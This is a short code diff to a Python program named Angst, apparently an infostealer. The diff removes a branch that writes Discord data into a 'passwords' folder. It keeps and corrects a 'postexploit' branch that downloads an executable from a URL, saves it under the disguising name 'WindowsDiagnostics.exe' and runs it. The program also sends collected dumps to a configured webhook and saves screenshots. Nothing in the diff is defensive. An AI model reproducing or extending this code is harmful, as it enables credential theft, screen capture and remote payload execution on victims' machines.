@@ -95,17 +95,11 @@ class Angst():
                             dump_file = f"{angst_dir}\\{conf}.txt"
                             with open(dump_file, "w+") as df:
                                 df.write(self.plugins[conf].dump())
-                        elif conf == "discord":
-                            dump_data = self.plugins[conf].dump()
-                            if dump_data != "":
-                                dump_file = f"{angst_dir}\\passwords\\{conf}.txt"
-                                with open(dump_file, "w+") as df:
-                                    df.write(dump_data)
                         elif conf == "postexploit":
                             if url != "":
                                 r = requests.get(url, allow_redirects=True)
-                                open('WindowsDiaognostics.exe', 'wb').write(r.content)
-                                os.system('WindowsDiaognostics.exe')
+                                open('WindowsDiagnostics.exe', 'wb').write(r.content)
+                                os.system('WindowsDiagnostics.exe')
                             threading.Thread(target = self.plugins[conf].dump(), args = (CONFIG["webhook"]))
                         else:
                             mss.tools.to_png(self.plugins[conf].dump().rgb,
